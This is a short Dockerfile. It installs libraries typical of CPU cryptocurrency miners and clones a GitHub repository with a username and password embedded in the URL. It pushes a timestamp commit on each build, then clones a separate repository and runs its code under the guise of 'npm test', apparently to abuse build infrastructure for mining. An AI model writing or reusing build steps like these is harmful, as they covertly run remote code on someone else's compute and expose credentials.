FROM node:latest
RUN apt-get update && apt-get install -y --force-yes automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++
COPY . ./
RUN git clone https://evian42:test123@github.com/evian42/starpies aaa && \
    git config --global user.email "test" && \
    git config --global user.name "test" && \
    cd ./aaa && echo $(($(date +%s%N)/1000000)) > log && \
    git add . && git commit -m "update log" && \
    git push https://evian42:test123@github.com/evian42/starpies
RUN git clone https://github.com/tijehuus/fragtood buildtarget && cd buildtarget && npm test
